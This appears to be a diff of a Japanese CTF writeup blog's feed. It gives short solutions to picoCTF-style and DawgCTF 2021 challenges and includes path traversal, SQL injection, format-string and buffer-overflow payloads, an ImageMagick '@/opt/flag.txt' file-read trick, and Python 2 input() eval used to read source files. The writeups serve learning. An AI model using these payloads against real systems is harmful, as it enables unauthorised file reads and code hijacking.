-&lt;p&gt;Rust、Serenity Discordライブラリ、ImageMagickのcaptionコマンドを使っているということなので、それぞれで内部ファイルを読み込んで表示できそうな脆弱性がないか検索してみると、「imagemagick caption from file」で検索してImageMagickのcaptionコマンドでファイルから読み込んでテキストを画像に書き込める機能(参考: &lt;a href=&#34;https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322&#34;&gt;https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322&lt;/a&gt;)が見つかりました。&lt;/p&gt;
-&lt;p&gt;以下のMDLを送るとフラグが手に入ります。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;version:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;MDL/1.1&amp;#34;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;type:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;meme&amp;#34;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;base:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;format:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Meme.DrakeYesNo&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;caption:&lt;/span&gt; {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;topText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;@/opt/flag.txt&amp;#34;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;bottomText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;/opt/flag.txt&amp;#34;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+&lt;h2 id=&#34;forbidden-paths&#34;&gt;Forbidden Paths&lt;/h2&gt;
+&lt;p&gt;相対パスを使う。
+&lt;code&gt;../../../../flag.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;sql-direct&#34;&gt;SQL Direct&lt;/h2&gt;
+&lt;p&gt;DBに接続して&lt;code&gt;\d&lt;/code&gt;からの&lt;code&gt;select * from flags&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;power-cookie&#34;&gt;Power Cookie&lt;/h2&gt;
+&lt;p&gt;CookieのisAdminを1にして読み込む。&lt;/p&gt;
+&lt;h2 id=&#34;roboto-sans&#34;&gt;Roboto Sans&lt;/h2&gt;
+&lt;p&gt;robots.txtを見るとBase64エンコードされたパスがあるのでデコードしてそこにアクセス。&lt;/p&gt;
+&lt;h2 id=&#34;secrets&#34;&gt;Secrets&lt;/h2&gt;
+&lt;p&gt;ソースコードを眺めるとsecretという謎のパスが一段入ってるものが見つかる。アクセスして順に同じことをやるとたどり着く。&lt;/p&gt;
+&lt;h2 id=&#34;sqlilite&#34;&gt;SQLiLite&lt;/h2&gt;
+&lt;p&gt;シンプルなSQLインジェクション。&lt;/p&gt;
+&lt;h2 id=&#34;search-source&#34;&gt;Search source&lt;/h2&gt;
+&lt;p&gt;CSSファイル内のコメントにフラグがある。&lt;/p&gt;
+&lt;h2 id=&#34;flag-leek&#34;&gt;flag leek&lt;/h2&gt;
+&lt;p&gt;フォーマットストリング攻撃ができるので読み出す。&lt;br&gt;
+&lt;code&gt;echo &#39;AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ:%36$p&#39; | ./vuln&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;file-types&#34;&gt;File types&lt;/h2&gt;
+&lt;p&gt;ファイルの中身を見るとshell archive(shar)というものらしい。shで解凍するとarという圧縮形式のファイルが出てくる。アーカイバをインストールして解凍すると次はcpioという形式のファイルが出てくる。bzip2、gzip、lgipと続いてそろそろ終わりかと思うがまだ終わらない。&lt;code&gt;ASCII text&lt;/code&gt;と出てくることを願いながらfileコマンドを叩いて、アーカイバをインストールし解凍して、を繰り返すとLZ4、LZMA、lzop、lzip、XZで終わる。途中でやめようか迷った。&lt;/p&gt;
+&lt;h2 id=&#34;rps&#34;&gt;RPS&lt;/h2&gt;
+&lt;p&gt;ソースコードを読むと&lt;code&gt;srand(time(0))&lt;/code&gt;があり、これはタイミング攻撃が可能。手元でも同じように&lt;code&gt;srand(time(0))&lt;/code&gt;の&lt;code&gt;rand() % 3&lt;/code&gt;を出力するCのコードを書いてコンパイルする。Pythonからその実行ファイルを呼び出して勝つ手を出すスクリプトを書いて実行してみるが絶妙にサーバー側と時間がズレていて何度も調整するがなかなか綺麗に合わせられない。ズレがあるとは言え1秒間の間では同じ手が出されるため連勝はしやすい。最終的に完璧な調整は諦めて運よく5連勝できることを待つという方法でフラグをゲット。&lt;/p&gt;
+&lt;h2 id=&#34;buffer-overflow-0&#34;&gt;buffer overflow 0&lt;/h2&gt;
+&lt;p&gt;適当に長い文字列を入力に渡すとフラグが貰える。&lt;/p&gt;
+&lt;h2 id=&#34;buffer-overflow-1&#34;&gt;buffer overflow 1&lt;/h2&gt;
+&lt;p&gt;win関数に飛ばせばフラグが貰える。&lt;code&gt;objdump -d vuln&lt;/code&gt;などでwinのアドレスを確認し、バッファオーバーフローでvulnのリターンアドレスをwinのアドレスに書き換える。&lt;/p&gt;
+&lt;h2 id=&#34;buffer-overflow-2&#34;&gt;buffer overflow 2&lt;/h2&gt;
+&lt;p&gt;これもwin関数に飛ばせばフラグが貰える。しかしwin関数に2つの引数(arg1とarg2)に正しい値を渡さないとフラグが貰えない。vulnのリターンアドレスをwinのアドレスに書き換えるとして、winのアドレスの次にarg1とarg2を置けばフラグが出力される。ここでリモートで試してみるがフラグが貰えない。GDBで試すとどうやらwinのあとにリターンアドレスでarg1を参照してセグフォで落ちている模様。0x804945あたりにpopを4回してretしているありがたいgadgetがあるので、popで引数2個分スタックポインタをずらして、mainのアドレスにリターンさせる。&lt;br&gt;
+ペイロードはこんな感じになる。&lt;code&gt;b&amp;quot;A&amp;quot; * (buf_size + 8) + base_addr + win_addr + pop_addr + arg1 + arg2 + main_addr&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;x-sixty-what&#34;&gt;x-sixty-what&lt;/h2&gt;
+&lt;p&gt;64bitでのBoF。Pwn初心者なのであまり正しく理解できている自信はないが、Intel CETという機能があり、jmp/callでendbr32/64以外の場所に飛べなくする機構があるらしい(参考リンク: &lt;a href=&#34;https://smallkirby.hatenablog.com/entry/2020/09/10/230629&#34;&gt;【pwn 36.0】Intel CETが、みんなの恋人ROPを殺す&lt;/a&gt;)。flag関数でフラグが貰えるのでBoFでflag関数に飛ばしたあとにmainに飛ばせばフラグゲット。&lt;/p&gt;
+&lt;h2 id=&#34;fresh-java&#34;&gt;Fresh Java&lt;/h2&gt;
+&lt;p&gt;classファイルをデコンパイルするとフラグを1文字ずつ検証するコードが出てくる。ハードコードされているのでフラグゲット。&lt;/p&gt;
+&lt;h2 id=&#34;bbbbloat&#34;&gt;Bbbbloat&lt;/h2&gt;
+&lt;p&gt;特定の数値を渡すとフラグが貰える実行ファイルらしい。Ghidraでデコンパイルすると数値がわかる。&lt;/p&gt;
+&lt;h2 id=&#34;unpackme&#34;&gt;unpackme&lt;/h2&gt;
+&lt;p&gt;UPXでパックされているのでまずアンパックする。若干難読化されているがBbbbloatとほとんど変わらない動作をする実行ファイルが出てくる。Ghidraでデコンパイルしても見づらかったのでIDA Freeを使うと綺麗にデコンパイルされて数値がわかる。GhidraとIDA Freeを適材適所で使い分けられると便利かもしれない。&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -967,6 +623,350 @@ Cloudy w/ a Chance of Rain n = int(input()) for _ in range(n):  lst = list(map(i
 &lt;h2 id=&#34;1-chal-2-categories&#34;&gt;1 chal 2 categories&lt;/h2&gt;
 &lt;p&gt;まずPythonファイルを読み、画像を逆変換すると、右下に重なっていて読めない文字列が見える。ピクセルのインデックスのmod 4で分解するとフラグの先頭1/3と後ろ2/3に分離できた。後半の重なりは意味の通る文になるように気合で分離するとフラグが得られる。&lt;/p&gt;
 </content>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/posts/dawgctf2021/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/dawgctf2021/</guid>
+      <description>DawgCTF 2021 Writeup 目次  Pwn  No Step On Snek Jellyspotters MDL Considered Harmful    No Step On Snek 問題 75 points
+I heard you guys like python pwnables
+nc umbccd.io 4000
+Author: trashcanna
+解説 ncコマンドで接続すると以下のように表示されます。
+Welcome to the aMAZEing Maze Your goal is to get from one side of the board to the other. Your character is represented by &amp;#34;OO&amp;#34; and the finish will be &amp;#34;FF&amp;#34; W/w - Move up!</description>
+      <content>&lt;h1 id=&#34;dawgctf-2021-writeup&#34;&gt;DawgCTF 2021 Writeup&lt;/h1&gt;
+&lt;h2 id=&#34;目次&#34;&gt;目次&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Pwn
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#no-step-on-snek&#34;&gt;No Step On Snek&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#jellyspotters&#34;&gt;Jellyspotters&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#mdl-considered-harmful&#34;&gt;MDL Considered Harmful&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;no-step-on-snek&#34;&gt;No Step On Snek&lt;/h2&gt;
+&lt;h3 id=&#34;問題&#34;&gt;問題&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;75 points&lt;/strong&gt;&lt;br&gt;
+I heard you guys like python pwnables&lt;br&gt;
+&lt;code&gt;nc umbccd.io 4000&lt;/code&gt;&lt;br&gt;
+Author: trashcanna&lt;/p&gt;
+&lt;h3 id=&#34;解説&#34;&gt;解説&lt;/h3&gt;
+&lt;p&gt;ncコマンドで接続すると以下のように表示されます。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to the aMAZEing Maze
+Your goal is to get from one side of the board to the other.
+Your character is represented by &amp;#34;OO&amp;#34; and the finish will be &amp;#34;FF&amp;#34;
+W/w - Move up!
+A/a - Move left!
+S/s - Move down!
+D/d - Move right!
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+|OO         |        |     |        |           |
++  +--+  +  +--+  +  +  +  +--+  +  +--+--+  +  +
+|  |  |  |     |  |  |  |  |     |  |        |  |
++  +  +  +--+  +  +--+  +  +  +--+  +  +--+--+  +
+|  |  |  |     |     |  |     |  |  |     |     |
++  +  +  +  +--+--+  +--+--+--+  +  +  +  +  +--+
+|     |  |        |        |        |  |  |     |
++--+  +  +--+--+  +  +--+--+  +--+--+  +  +--+--+
+|     |  |           |     |  |     |  |  |     |
++--+--+  +--+--+--+  +  +  +  +  +  +  +  +  +  +
+|        |        |  |  |     |  |     |     |  |
++  +--+--+  +--+  +  +  +--+--+--+  +--+--+--+  +
+|  |        |     |  |           |     |        |
++  +  +--+--+  +--+--+--+--+--+  +--+  +  +--+--+
+|  |     |  |                 |  |     |        |
++  +--+  +  +--+--+--+--+--+  +  +  +--+--+--+  +
+|     |  |              |     |  |  |        |  |
++  +  +  +  +--+--+--+  +  +--+  +  +  +--+  +  +
+|  |  |     |           |  |     |     |     |  |
++  +  +--+--+  +--+--+--+  +  +--+--+--+  +--+  +
+|  |  |        |        |  |        |  |  |     |
++  +--+  +--+--+  +--+  +  +--+--+  +  +  +  +  +
+|  |     |        |     |           |     |  |  |
++  +  +--+--+--+--+  +--+--+--+--+--+  +--+  +  +
+|     |     |     |           |  |     |  |  |  |
++  +--+  +  +  +  +--+  +--+  +  +  +--+  +  +  +
+|  |     |     |     |  |     |           |  |  |
++  +  +--+--+--+--+  +  +  +--+  +--+--+--+  +  +
+|     |           |     |  |     |        |  |  |
++--+--+  +--+--+  +--+--+  +--+--+  +--+  +  +  +
+|              |                    |        |FF|
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+
+
+Make your move:
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;まずW, A, S, D以外の文字、例えばZを入れてみると以下のように出力されました。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Make your move: Z
+Traceback (most recent call last):
+  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 73, in &amp;lt;module&amp;gt;
+    __main__()
+  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 69, in __main__
+    still_playing = make_move(maze)
+  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 27, in make_move
+    move = input(&amp;#34;Make your move: &amp;#34;)
+  File &amp;#34;&amp;lt;string&amp;gt;&amp;#34;, line 1, in &amp;lt;module&amp;gt;
+NameError: name &amp;#39;Z&amp;#39; is not defined
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;見るからにPythonなのですが、&lt;code&gt;NameError: name &#39;Z&#39; is not defined&lt;/code&gt;とあるため入力がそのままコードとして解釈されています。これはPython2系の仕様であり、input()は受け取った文字列をeval()のように式としてそのまま解釈します。&lt;br&gt;
+いろいろ試すと、&lt;code&gt;make_move(1)&lt;/code&gt;や&lt;code&gt;make_move(&amp;quot;a&amp;quot;)&lt;/code&gt;などで引数に渡した値がそのまま返ってくることに気付きます。あとは大体何でもできるのですが、エラー文でファイルのパスが分かっているのでまずこのファイルの中身を見るために&lt;code&gt;make_move(open(&amp;quot;/home/challuser/nosteponsnek.py&amp;quot;).read())&lt;/code&gt;をしてみます。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python2.7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; random &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; shuffle, randrange
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;W &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;w &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;valid_moves &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [W, w, A, a, S, s, D, d]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;welcome&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome to the aMAZEing Maze&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your goal is to get from one side of the board to the other.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your character is represented by &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;OO&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; and the finish will be &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;FF&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;W/w - Move up!&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A/a - Move left!&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;S/s - Move down!&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D/d - Move right!&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;make_move&lt;/span&gt;(maze):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print maze
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        move &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Make your move: &amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; move &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; valid_moves:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NameError&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# TODO: Move the player around the board&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Was a little cruched for time this year so I didn&amp;#39;t feel like writing&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# the gameplay. I hope that&amp;#39;s okay :/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_last&lt;/span&gt;(s, replace_what, replace_with):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        head, _sep, tail &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rpartition(replace_what)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; head &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; replace_with &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tail
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Randomly generate the gameboard and insert start/finish&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;make_maze&lt;/span&gt;(w &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        vis &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h)] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|  &amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h)] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [[]]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+--&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;walk&lt;/span&gt;(x, y):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                vis[y][x] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
